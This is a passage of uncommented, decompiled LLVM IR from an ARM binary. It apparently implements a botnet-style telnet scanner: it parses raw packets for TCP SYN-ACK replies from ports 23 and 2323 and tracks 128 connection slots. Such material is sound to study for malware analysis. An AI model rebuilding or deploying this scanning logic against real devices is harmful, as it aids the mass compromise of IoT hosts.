  store i32 %v2_111e4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v0_11240, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v7_11204 = call i32 @function_13e8c(i32 %v2_111e4, i32* %v6_11204, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v7_11204, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11208 = icmp eq i32 %v7_11204, 0
  store i1 %v2_11208, i1* %cpsr_z.global-to-local, align 1
  %tmp304 = icmp slt i32 %v7_11204, 1
  br i1 %tmp304, label %dec_label_pc_11388, label %dec_label_pc_11210

dec_label_pc_11210:                               ; preds = %dec_label_pc_111d4
  store i32 %v0_111c8, i32* %lr.global-to-local, align 4
  %v2_11214 = load i32, i32* %v2_111dc, align 4
  store i32 %v2_11214, i32* %r3.global-to-local, align 4
  %v2_11218 = icmp ugt i32 %v2_11214, 10
  store i1 %v2_11218, i1* %cpsr_c.global-to-local, align 1
  %v7_11218 = icmp eq i32 %v2_11214, 11
  store i1 %v7_11218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11218, label %dec_label_pc_11388, label %dec_label_pc_11220

dec_label_pc_11220:                               ; preds = %dec_label_pc_11210
  %v2_11220 = icmp ugt i32 %v7_11204, 38
  store i1 %v2_11220, i1* %cpsr_c.global-to-local, align 1
  %v7_11220 = icmp eq i32 %v7_11204, 39
  store i1 %v7_11220, i1* %cpsr_z.global-to-local, align 1
  %v2_11224 = xor i1 %v2_11220, true
  %v3_11224 = or i1 %v7_11220, %v2_11224
  br i1 %v3_11224, label %dec_label_pc_111d4, label %dec_label_pc_11228

dec_label_pc_11228:                               ; preds = %dec_label_pc_11220
  store i32 %v0_11240, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec7c.86 to i32), i32* %r1.global-to-local, align 4
  %v3_11230 = load i32, i32* %v2_11230, align 4
  store i32 %v3_11230, i32* %r2.global-to-local, align 4
  %v2_11234 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_11234, i32* %r3.global-to-local, align 4
  %v3_11238 = icmp uge i32 %v3_11230, %v2_11234
  store i1 %v3_11238, i1* %cpsr_c.global-to-local, align 1
  %v9_11238 = icmp eq i32 %v3_11230, %v2_11234
  store i1 %v9_11238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11238, label %dec_label_pc_11240, label %dec_label_pc_111d4

dec_label_pc_11240:                               ; preds = %dec_label_pc_11228
  %v3_11240 = load i8, i8* %v2_11240, align 1
  %v4_11240 = zext i8 %v3_11240 to i32
  store i32 %v4_11240, i32* %r3.global-to-local, align 4
  %v2_11244 = icmp ugt i8 %v3_11240, 5
  store i1 %v2_11244, i1* %cpsr_c.global-to-local, align 1
  %v7_11244 = icmp eq i8 %v3_11240, 6
  store i1 %v7_11244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11244, label %dec_label_pc_1124c, label %dec_label_pc_111d4

dec_label_pc_1124c:                               ; preds = %dec_label_pc_11240
  store i32 %v4_1124c, i32* %r3.global-to-local, align 4
  %v2_11250 = load i8, i8* %stack_var_-1884.0, align 1
  %v3_11250 = zext i8 %v2_11250 to i32
  store i32 %v3_11250, i32* %r2.global-to-local, align 4
  %v3_11254 = load i8, i8* %v2_11254, align 1
  %v4_11254 = zext i8 %v3_11254 to i32
  store i32 %v4_11254, i32* %r3.global-to-local, align 4
  %v4_11258 = mul nuw nsw i32 %v4_11254, 256
  %v5_11258 = or i32 %v4_11258, %v3_11250
  store i32 %v5_11258, i32* %r2.global-to-local, align 4
  %v2_1125c = icmp ugt i32 %v5_11258, 5887
  store i1 %v2_1125c, i1* %cpsr_c.global-to-local, align 1
  %v7_1125c = icmp eq i32 %v5_11258, 5888
  store i1 %v7_1125c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1125c, label %dec_label_pc_11274, label %dec_label_pc_11264

dec_label_pc_11264:                               ; preds = %dec_label_pc_1124c
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_1126c = icmp ugt i32 %v5_11258, 4872
  store i1 %v3_1126c, i1* %cpsr_c.global-to-local, align 1
  %v9_1126c = icmp eq i32 %v5_11258, 4873
  store i1 %v9_1126c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1126c, label %dec_label_pc_11274, label %dec_label_pc_111d4

dec_label_pc_11274:                               ; preds = %dec_label_pc_11264, %dec_label_pc_1124c
  store i32 %v4_1124c, i32* %ip.global-to-local, align 4
  %v3_11278 = load i8, i8* %v2_11278, align 1
  %v4_11278 = zext i8 %v3_11278 to i32
  store i32 %v4_11278, i32* %r3.global-to-local, align 4
  %v3_1127c = load i8, i8* %v2_1127c, align 1
  %v4_1127c = zext i8 %v3_1127c to i32
  store i32 %v4_1127c, i32* %r2.global-to-local, align 4
  store i32 %v4_11280, i32* %lr.global-to-local, align 4
  %v4_11284 = mul nuw nsw i32 %v4_1127c, 256
  %v5_11284 = or i32 %v4_11284, %v4_11278
  store i32 %v5_11284, i32* %r3.global-to-local, align 4
  %v3_11288 = icmp uge i32 %v5_11284, %v4_11280
  store i1 %v3_11288, i1* %cpsr_c.global-to-local, align 1
  %v9_11288 = icmp eq i32 %v5_11284, %v4_11280
  store i1 %v9_11288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11288, label %dec_label_pc_11290, label %dec_label_pc_111d4

dec_label_pc_11290:                               ; preds = %dec_label_pc_11274
  %v3_11290 = load i8, i8* %v2_11290, align 1
  %v4_11290 = zext i8 %v3_11290 to i32
  store i32 %v4_11290, i32* %r3.global-to-local, align 4
  %v1_11294 = and i32 %v4_11290, 2
  %v2_11294 = icmp eq i32 %v1_11294, 0
  store i1 %v2_11294, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11294, label %dec_label_pc_111d4, label %dec_label_pc_1129c

dec_label_pc_1129c:                               ; preds = %dec_label_pc_11290
  %v1_1129c = and i32 %v4_11290, 16
  %v2_1129c = icmp eq i32 %v1_1129c, 0
  store i1 %v2_1129c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1129c, label %dec_label_pc_111d4, label %dec_label_pc_112a4

dec_label_pc_112a4:                               ; preds = %dec_label_pc_1129c
  %v1_112a4 = and i32 %v4_11290, 4
  %v2_112a4 = icmp eq i32 %v1_112a4, 0
  store i1 %v2_112a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112a4, label %dec_label_pc_112ac, label %dec_label_pc_111d4

dec_label_pc_112ac:                               ; preds = %dec_label_pc_112a4
  %tmp448 = urem i8 %v3_11290, 2
  %v2_112ac = icmp eq i8 %tmp448, 0
  store i1 %v2_112ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_112ac, label %dec_label_pc_112b4, label %dec_label_pc_111d4

dec_label_pc_112b4:                               ; preds = %dec_label_pc_112ac
  %v3_112b4 = load i32, i32* %v2_112b4, align 4
  %v1_112bc = and i32 %v3_112b4, ptrtoint (i32* @global_var_ff00.24 to i32)
  %v3_112c0 = mul i32 %v3_112b4, 16777216
  %v1_112b8 = udiv i32 %v3_112b4, 256
  %v3_112c4 = and i32 %v1_112b8, 65280
  %v4_112c8 = mul i32 %v1_112bc, 256
  %v4_112cc = udiv i32 %v3_112b4, 16777216
  %v5_112cc = or i32 %v4_112cc, %v3_112c0
  %v5_112c8 = or i32 %v5_112cc, %v4_112c8
  %v2_112d0 = or i32 %v5_112c8, %v3_112c4
  %v1_112d4 = add i32 %v2_112d0, -1
  %v1_112d8 = udiv i32 %v1_112d4, 256
  %v3_112dc = and i32 %v1_112d8, 65280
  %v1_112e0 = and i32 %v1_112d4, 65280
  store i32 %v1_112e0, i32* %r2.global-to-local, align 4
  %v3_112e4 = mul i32 %v1_112d4, 16777216
  %v4_112e8 = udiv i32 %v1_112d4, 16777216
  %v5_112e8 = or i32 %v3_112dc, %v4_112e8
  store i32 %v5_112e8, i32* %r1.global-to-local, align 4
  store i32 %v0_11240, i32* %r3.global-to-local, align 4
  %v4_112f0 = mul nuw nsw i32 %v1_112e0, 256
  %v5_112f0 = or i32 %v4_112f0, %v3_112e4
  store i32 %v5_112f0, i32* %r0.global-to-local, align 4
  %v3_112f4 = load i32, i32* %v2_112f4, align 4
  store i32 %v3_112f4, i32* %r2.global-to-local, align 4
  %v2_112f8 = call i32 @llvm.bswap.i32(i32 %v1_112d4)
  store i32 %v2_112f8, i32* %ip.global-to-local, align 4
  %v3_112fc = icmp uge i32 %v2_112f8, %v3_112f4
  store i1 %v3_112fc, i1* %cpsr_c.global-to-local, align 1
  %v9_112fc = icmp eq i32 %v2_112f8, %v3_112f4
  store i1 %v9_112fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_112fc, label %dec_label_pc_11304, label %dec_label_pc_111d4

dec_label_pc_11304:                               ; preds = %dec_label_pc_112b4
  %v0_11304 = load i32, i32* @r4, align 4
  %v2_11304 = icmp ugt i32 %v0_11304, 126
  store i1 %v2_11304, i1* %cpsr_c.global-to-local, align 1
  %v7_11304 = icmp eq i32 %v0_11304, 127
  store i1 %v7_11304, i1* %cpsr_z.global-to-local, align 1
  %v8_11308 = icmp sgt i32 %v0_11304, 127
  br i1 %v8_11308, label %dec_label_pc_11388, label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_11304
  store i32 ptrtoint (i32* @global_var_1ec98.197 to i32), i32* %lr.global-to-local, align 4
  %v3_11310 = mul i32 %v0_11304, 256
  store i32 %v3_11310, i32* %r2.global-to-local, align 4
  %v2_11314 = load i32, i32* @global_var_1ec98.197, align 4
  store i32 %v2_11314, i32* %r1.global-to-local, align 4
  %v2_1131c = mul i32 %v0_11304, 288
  store i32 %v2_1131c, i32* %r3.global-to-local, align 4
  %v2_11320 = add i32 %v2_11314, %v2_1131c
  store i32 %v2_11320, i32* @r0, align 4
  %v1_11324 = add i32 %v2_11320, 12
  %v2_11324 = inttoptr i32 %v1_11324 to i32*
  %v3_11324 = load i32, i32* %v2_11324, align 4
  store i32 %v3_11324, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11328 = icmp eq i32 %v3_11324, 0
  store i1 %v2_11328, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11328, label %dec_label_pc_11354, label %dec_label_pc_11334.preheader

dec_label_pc_11334.preheader:                     ; preds = %dec_label_pc_1130c
  %v2_1132c = add i32 %v2_11320, 288
  store i32 %v2_1132c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11334

dec_label_pc_11334:                               ; preds = %dec_label_pc_11334.preheader, %dec_label_pc_11340
  %v0_11340 = phi i32 [ %v2_1132c, %dec_label_pc_11334.preheader ], [ %v1_1134c, %dec_label_pc_11340 ]
  %v0_11334 = phi i32 [ %v0_11304, %dec_label_pc_11334.preheader ], [ %v1_11334, %dec_label_pc_11340 ]
  %v1_11334 = add i32 %v0_11334, 1
  store i32 %v1_11334, i32* @r4, align 4
  %v7_11338 = icmp eq i32 %v1_11334, 128
  br i1 %v7_11338, label %dec_label_pc_11388.loopexit, label %dec_label_pc_11340

dec_label_pc_11340:                               ; preds = %dec_label_pc_11334
  store i32 %v0_11340, i32* @r0, align 4
  %v1_11344 = add i32 %v0_11340, 12
  %v2_11344 = inttoptr i32 %v1_11344 to i32*
  %v3_11344 = load i32, i32* %v2_11344, align 4
  %v2_11348 = icmp eq i32 %v3_11344, 0
  %v1_1134c = add i32 %v0_11340, 288
  store i32 %v1_1134c, i32* %r3.global-to-local, align 4
  br i1 %v2_11348, label %dec_label_pc_11354.loopexit, label %dec_label_pc_11334

dec_label_pc_11354.loopexit:                      ; preds = %dec_label_pc_11340
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11354

dec_label_pc_11354:                               ; preds = %dec_label_pc_11354.loopexit, %dec_label_pc_1130c
  %v1_11354 = phi i32 [ %v0_11340, %dec_label_pc_11354.loopexit ], [ %v2_11320, %dec_label_pc_1130c ]
  %v2_11354 = add i32 %v1_11354, 16
  %v3_11354 = inttoptr i32 %v2_11354 to i32*
  store i32 %v3_112f4, i32* %v3_11354, align 4
  store i32 %v4_1124c, i32* %r1.global-to-local, align 4
  %v2_1135c = load i32, i32* %v1_1135c, align 4
  store i32 %v2_1135c, i32* %r2.global-to-local, align 4
  %v1_11360 = and i32 %v2_1135c, 128
  %v2_11360 = icmp ne i32 %v1_11360, 0
  store i1 %v2_11360, i1* %cpsr_c.global-to-local, align 1
  %v3_11360 = sdiv i32 %v2_1135c, 256
  store i32 %v3_11360, i32* %r3.global-to-local, align 4
  %v1_11364 = trunc i32 %v3_11360 to i8
  %v2_11364 = load i32, i32* @r0, align 4
  %v3_11364 = add i32 %v2_11364, 21
  %v4_11364 = inttoptr i32 %v3_11364 to i8*
  store i8 %v1_11364, i8* %v4_11364, align 1
  %v0_11368 = load i32, i32* %r2.global-to-local, align 4
  %v1_11368 = trunc i32 %v0_11368 to i8
  %v2_11368 = load i32, i32* @r0, align 4
  %v3_11368 = add i32 %v2_11368, 20
  %v4_11368 = inttoptr i32 %v3_11368 to i8*
  store i8 %v1_11368, i8* %v4_11368, align 1
  %v0_1136c = call i32 @function_106a4()
  store i32 %v0_1136c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_111d4

dec_label_pc_11374:                               ; preds = %dec_label_pc_109f8
  store i32 ptrtoint (i32* @global_var_1ec9c.199 to i32), i32* %r2.global-to-local, align 4
  %v2_11378 = load i32, i32* @global_var_1ec9c.199, align 4
  store i32 %v2_11378, i32* %r0.global-to-local, align 4
  %v1_1137c = call i32 @function_13654(i32 %v2_11378)
  store i32 %v1_1137c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11380

dec_label_pc_11380:                               ; preds = %dec_label_pc_109d0, %dec_label_pc_11374
  %v0_11380 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11380, i32* %r0.global-to-local, align 4
  %v1_11384 = call i32 @function_149f0(i32 %v0_11380)
  store i32 %v1_11384, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11388

dec_label_pc_11388.loopexit:                      ; preds = %dec_label_pc_11334
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11388

dec_label_pc_11388:                               ; preds = %dec_label_pc_11304, %dec_label_pc_11210, %dec_label_pc_111d4, %dec_label_pc_11388.loopexit, %dec_label_pc_11380
  %stack_var_-1868.0 = phi i32 [ %tmp232, %dec_label_pc_11380 ], [ %v0_111c8, %dec_label_pc_11388.loopexit ], [ %v0_111c8, %dec_label_pc_111d4 ], [ %v0_111c8, %dec_label_pc_11210 ], [ %v0_111c8, %dec_label_pc_11304 ]
  %stack_var_-1872.2 = phi i32 [ %tmp239, %dec_label_pc_11380 ], [ %stack_var_-1872.1, %dec_label_pc_11388.loopexit ], [ %stack_var_-1872.1, %dec_label_pc_111d4 ], [ %stack_var_-1872.1, %dec_label_pc_11210 ], [ %stack_var_-1872.1, %dec_label_pc_11304 ]
  %stack_var_-1884.1 = phi i8* [ %tmp240, %dec_label_pc_11380 ], [ %stack_var_-1884.0, %dec_label_pc_11388.loopexit ], [ %stack_var_-1884.0, %dec_label_pc_111d4 ], [ %stack_var_-1884.0, %dec_label_pc_11210 ], [ %stack_var_-1884.0, %dec_label_pc_11304 ]
  %stack_var_-1880.1 = phi i32 [ %tmp241, %dec_label_pc_11380 ], [ %v0_11240, %dec_label_pc_11388.loopexit ], [ %v0_11240, %dec_label_pc_111d4 ], [ %v0_11240, %dec_label_pc_11210 ], [ %v0_11240, %dec_label_pc_11304 ]
  %stack_var_-1876.1 = phi i8 [ %tmp242, %dec_label_pc_11380 ], [ %stack_var_-1876.0, %dec_label_pc_11388.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_111d4 ], [ %stack_var_-1876.0, %dec_label_pc_11210 ], [ %stack_var_-1876.0, %dec_label_pc_11304 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1672, i32* %ip.global-to-local, align 4
  %v2_113a0404 = load i32, i32* @sp, align 4
  %v3_113a0405 = add i32 %v2_113a0404, 1672
  %v4_113a0406 = inttoptr i32 %v3_113a0405 to i32*
  store i32 0, i32* %v4_113a0406, align 4
  br label %dec_label_pc_11390.dec_label_pc_11390_crit_edge

dec_label_pc_11390.dec_label_pc_11390_crit_edge:  ; preds = %dec_label_pc_11388, %dec_label_pc_11390.dec_label_pc_11390_crit_edge
  %v0_11390.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_113a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11394 = add i32 %v0_11390.pre, 4
  store i32 %v1_11394, i32* %r3.global-to-local, align 4
  %v1_11398 = add i32 %v0_11390.pre, 1672
  store i32 %v1_11398, i32* %ip.global-to-local, align 4
  %v7_1139c = icmp eq i32 %v1_11394, 128
  %v2_113a0 = load i32, i32* @sp, align 4
  %v3_113a0 = add i32 %v2_113a0, %v1_11398
  %v4_113a0 = inttoptr i32 %v3_113a0 to i32*
  store i32 %v0_113a0.pre, i32* %v4_113a0, align 4
  br i1 %v7_1139c, label %dec_label_pc_113a8, label %dec_label_pc_11390.dec_label_pc_11390_crit_edge

dec_label_pc_113a8:                               ; preds = %dec_label_pc_11390.dec_label_pc_11390_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_113a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_113b0398 = add i32 %v0_113a8, 4
  store i32 %v1_113b0398, i32* %r3.global-to-local, align 4
  %v1_113b4399 = add i32 %v0_113a8, 1544
  store i32 %v1_113b4399, i32* %lr.global-to-local, align 4
  %v7_113b8400 = icmp eq i32 %v1_113b0398, 128
  %v2_113bc401 = load i32, i32* @sp, align 4
  %v3_113bc402 = add i32 %v2_113bc401, %v1_113b4399
  %v4_113bc403 = inttoptr i32 %v3_113bc402 to i32*
  store i32 %v0_113a8, i32* %v4_113bc403, align 4
  br i1 %v7_113b8400, label %dec_label_pc_113c4, label %dec_label_pc_113ac.dec_label_pc_113ac_crit_edge

dec_label_pc_113ac.dec_label_pc_113ac_crit_edge:  ; preds = %dec_label_pc_113a8, %dec_label_pc_113ac.dec_label_pc_113ac_crit_edge
  %v0_113ac.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_113bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_113b0 = add i32 %v0_113ac.pre, 4
  store i32 %v1_113b0, i32* %r3.global-to-local, align 4
  %v1_113b4 = add i32 %v0_113ac.pre, 1544
  store i32 %v1_113b4, i32* %lr.global-to-local, align 4
  %v7_113b8 = icmp eq i32 %v1_113b0, 128
  %v2_113bc = load i32, i32* @sp, align 4
  %v3_113bc = add i32 %v2_113bc, %v1_113b4
  %v4_113bc = inttoptr i32 %v3_113bc to i32*
  store i32 %v0_113bc.pre, i32* %v4_113bc, align 4
  br i1 %v7_113b8, label %dec_label_pc_113c4, label %dec_label_pc_113ac.dec_label_pc_113ac_crit_edge

dec_label_pc_113c4:                               ; preds = %dec_label_pc_113ac.dec_label_pc_113ac_crit_edge, %dec_label_pc_113a8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_113c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_113c4, i32* @r6, align 4
  store i32 %v0_113c4, i32* @r5, align 4
  store i32 %v0_113c4, i32* @r7, align 4
  store i32 %v0_113c4, i32* %stack_var_-52, align 4
  %v2_11480 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_1143c

dec_label_pc_113d8:                               ; preds = %dec_label_pc_11464, %dec_label_pc_1143c
  %storemerge222 = phi i32 [ 30, %dec_label_pc_1143c ], [ 5, %dec_label_pc_11464 ]
  store i32 %storemerge222, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec34.185 to i32), i32* %r2.global-to-local, align 4
  %v2_113dc = load i32, i32* @global_var_1ec34.185, align 4
  store i32 %v2_113dc, i32* %r3.global-to-local, align 4
  %v1_113e0 = add i32 %v2_11450, 8
  %v2_113e0 = inttoptr i32 %v1_113e0 to i32*
  %v3_113e0 = load i32, i32* %v2_113e0, align 4
  store i32 %v3_113e0, i32* %r2.global-to-local, align 4
  %v2_113e4 = sub i32 %v2_113dc, %v3_113e0
  store i32 %v2_113e4, i32* %r3.global-to-local, align 4
  %v3_113e8 = icmp uge i32 %v2_113e4, %storemerge222
  store i1 %v3_113e8, i1* %cpsr_c.global-to-local, align 1
  %v9_113e8 = icmp eq i32 %v2_113e4, %storemerge222
  store i1 %v9_113e8, i1* %cpsr_z.global-to-local, align 1
  %v2_113ec = xor i1 %v9_113e8, true
  %v3_113ec = and i1 %v3_113e8, %v2_113ec
  br i1 %v3_113ec, label %dec_label_pc_114a4, label %dec_label_pc_113f0

dec_label_pc_113f0:                               ; preds = %dec_label_pc_113d8
  store i1 %v2_11458, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_11458, i1* %cpsr_z.global-to-local, align 1
  %v1_11474 = add i32 %v2_11450, 4
  %v2_11474 = inttoptr i32 %v1_11474 to i32*
  %v3_11474 = load i32, i32* %v2_11474, align 4
  br i1 %v7_11458, label %dec_label_pc_11474, label %dec_label_pc_113f8

dec_label_pc_113f8:                               ; preds = %dec_label_pc_113f0
  store i32 %v3_11474, i32* %ip.global-to-local, align 4
  %v3_113fc = udiv i32 %v3_11474, 32
  store i32 %v2_11480, i32* %r0.global-to-local, align 4
  %v3_11404 = mul nuw nsw i32 %v3_113fc, 4
  %v2_11408 = add i32 %v3_11404, %v2_11480
  store i32 %v2_11408, i32* %r3.global-to-local, align 4
  %v1_1140c = add i32 %v2_11408, -184
  %v2_1140c = inttoptr i32 %v1_1140c to i32*
  %v3_1140c = load i32, i32* %v2_1140c, align 4
  %v1_11410 = urem i32 %v3_11474, 32
  store i32 %v1_11410, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_11418 = shl i32 1, %v1_11410
  %v8_11418 = or i32 %v3_1140c, %v7_11418
  store i32 %v8_11418, i32* %r2.global-to-local, align 4
  store i32 %v8_11418, i32* %v2_1140c, align 4
  %v0_11420 = load i32, i32* @r6, align 4
  %v1_11420 = load i32, i32* %ip.global-to-local, align 4
  %v3_11420 = icmp uge i32 %v0_11420, %v1_11420
  store i1 %v3_11420, i1* %cpsr_c.global-to-local, align 1
  %v9_11420 = icmp eq i32 %v0_11420, %v1_11420
  store i1 %v9_11420, i1* %cpsr_z.global-to-local, align 1
  %v5_11424 = icmp slt i32 %v0_11420, %v1_11420
  br i1 %v5_11424, label %bb306, label %bb307

bb306:                                            ; preds = %dec_label_pc_113f8
  store i32 %v1_11420, i32* @r6, align 4
  br label %bb307

bb307:                                            ; preds = %dec_label_pc_11464, %dec_label_pc_12100, %dec_label_pc_114d8, %bb309, %dec_label_pc_113f8, %bb306
  %v3_11428 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_11428, i32* %r3.global-to-local, align 4
  %v1_1142c = add i32 %v3_11428, 1
  store i32 %v1_1142c, i32* %r2.global-to-local, align 4
  %v2_11430 = icmp ugt i32 %v1_1142c, 126
  store i1 %v2_11430, i1* %cpsr_c.global-to-local, align 1
  %v7_11430 = icmp eq i32 %v1_1142c, 127
  store i1 %v7_11430, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1142c, i32* %stack_var_-52, align 4
  %v8_11438 = icmp sgt i32 %v1_1142c, 127
  br i1 %v8_11438, label %dec_label_pc_114e4, label %dec_label_pc_1143c

dec_label_pc_1143c:                               ; preds = %bb307, %dec_label_pc_113c4
  %v0_11448 = phi i32 [ %v1_1142c, %bb307 ], [ %v0_113c4, %dec_label_pc_113c4 ]
  store i32 ptrtoint (i32* @global_var_1ec98.197 to i32), i32* %r0.global-to-local, align 4
  %v3_11440 = mul i32 %v0_11448, 256
  store i32 %v3_11440, i32* %r3.global-to-local, align 4
  %v2_11444 = load i32, i32* @global_var_1ec98.197, align 4
  store i32 %v2_11444, i32* %r1.global-to-local, align 4
  %v2_1144c = mul i32 %v0_11448, 288
  store i32 %v2_1144c, i32* %r2.global-to-local, align 4
  %v2_11450 = add i32 %v2_11444, %v2_1144c
  store i32 %v2_11450, i32* @r4, align 4
  %v1_11454 = add i32 %v2_11450, 12
  %v2_11454 = inttoptr i32 %v1_11454 to i32*
  %v3_11454 = load i32, i32* %v2_11454, align 4
  store i32 %v3_11454, i32* %ip.global-to-local, align 4
  %v2_11458 = icmp ne i32 %v3_11454, 0
  store i1 %v2_11458, i1* %cpsr_c.global-to-local, align 1
  %v7_11458 = icmp eq i32 %v3_11454, 1
  store i1 %v7_11458, i1* %cpsr_z.global-to-local, align 1
  %v2_1145c = xor i1 %v7_11458, true
  %v3_1145c = and i1 %v2_11458, %v2_1145c
  br i1 %v3_1145c, label %dec_label_pc_113d8, label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %dec_label_pc_1143c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11464 = icmp eq i32 %v3_11454, 0
  store i1 %v2_11464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11464, label %bb307, label %dec_label_pc_113d8

dec_label_pc_11474:                               ; preds = %dec_label_pc_113f0
  store i32 %v3_11474, i32* %r0.global-to-local, align 4
  %v3_11478 = udiv i32 %v3_11474, 32
  %v3_1147c = mul nuw nsw i32 %v3_11478, 4
  store i32 %v2_11480, i32* %lr.global-to-local, align 4
  %v2_11484 = add i32 %v3_1147c, %v2_11480
  store i32 %v2_11484, i32* %r3.global-to-local, align 4
  %v1_11488 = add i32 %v2_11484, -312
  %v2_11488 = inttoptr i32 %v1_11488 to i32*
  %v3_11488 = load i32, i32* %v2_11488, align 4
  %v1_1148c = urem i32 %v3_11474, 32
  store i32 %v1_1148c, i32* %r1.global-to-local, align 4
  %v7_11490 = shl i32 1, %v1_1148c
  %v8_11490 = or i32 %v3_11488, %v7_11490
  store i32 %v8_11490, i32* %r2.global-to-local, align 4
  %v0_11494 = load i32, i32* @r5, align 4
  %v3_11494 = icmp uge i32 %v0_11494, %v3_11474
  store i1 %v3_11494, i1* %cpsr_c.global-to-local, align 1
  %v9_11494 = icmp eq i32 %v0_11494, %v3_11474
  store i1 %v9_11494, i1* %cpsr_z.global-to-local, align 1
  %v5_11498 = icmp slt i32 %v0_11494, %v3_11474
  br i1 %v5_11498, label %bb308, label %bb309

bb308:                                            ; preds = %dec_label_pc_11474
  store i32 %v3_11474, i32* @r5, align 4
  br label %bb309

bb309:                                            ; preds = %dec_label_pc_11474, %bb308
  store i32 %v8_11490, i32* %v2_11488, align 4
  br label %bb307

dec_label_pc_114a4:                               ; preds = %dec_label_pc_113d8
  %v1_114a4 = add i32 %v2_11450, 4
  %v2_114a4 = inttoptr i32 %v1_114a4 to i32*
  %v3_114a4 = load i32, i32* %v2_114a4, align 4
  store i32 %v3_114a4, i32* %r0.global-to-local, align 4
  %v1_114a8 = call i32 @function_13654(i32 %v3_114a4)
  store i32 %v1_114a8, i32* %r0.global-to-local, align 4
  %v0_114ac = load i32, i32* @r4, align 4
  %v1_114ac = add i32 %v0_114ac, 12
  %v2_114ac = inttoptr i32 %v1_114ac to i32*
  %v3_114ac = load i32, i32* %v2_114ac, align 4
  store i32 %v3_114ac, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_114b4 = icmp ugt i32 %v3_114ac, 1
  store i1 %v2_114b4, i1* %cpsr_c.global-to-local, align 1
  %v7_114b4 = icmp eq i32 %v3_114ac, 2
  store i1 %v7_114b4, i1* %cpsr_z.global-to-local, align 1
  %v2_114b8 = add i32 %v0_114ac, 4
  %v3_114b8 = inttoptr i32 %v2_114b8 to i32*
  store i32 -1, i32* %v3_114b8, align 4
  %v2_114bc = xor i1 %v2_114b4, true
  %v3_114bc = or i1 %v7_114b4, %v2_114bc
  br i1 %v3_114bc, label %dec_label_pc_12100, label %dec_label_pc_114c0

dec_label_pc_114c0:                               ; preds = %dec_label_pc_114a4
  %v0_114c0 = load i32, i32* @r4, align 4
  %v1_114c0 = add i32 %v0_114c0, 284
  %v2_114c0 = inttoptr i32 %v1_114c0 to i8*
  %v3_114c0 = load i8, i8* %v2_114c0, align 1
  %v4_114c0 = zext i8 %v3_114c0 to i32
  %v1_114c4 = add nuw nsw i32 %v4_114c0, 1
  %v1_114c8 = urem i32 %v1_114c4, 256
  store i32 %v1_114c8, i32* %r3.global-to-local, align 4
  %v2_114cc = icmp ugt i32 %v1_114c8, 9
  store i1 %v2_114cc, i1* %cpsr_c.global-to-local, align 1
  %v7_114cc = icmp eq i32 %v1_114c8, 10
  store i1 %v7_114cc, i1* %cpsr_z.global-to-local, align 1
  %v1_114d0 = trunc i32 %v1_114c4 to i8
  store i8 %v1_114d0, i8* %v2_114c0, align 1
  %v0_114d4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_114d4, label %dec_label_pc_12100, label %dec_label_pc_114d8

dec_label_pc_114d8:                               ; preds = %dec_label_pc_114c0
  %v0_114d8 = load i32, i32* @r4, align 4
  store i32 %v0_114d8, i32* @r0, align 4
  %v0_114dc = call i32 @function_106a4()
  store i32 %v0_114dc, i32* %r0.global-to-local, align 4
  br label %bb307

dec_label_pc_114e4:                               ; preds = %bb307
  store i32 1, i32* %stack_var_-64, align 4
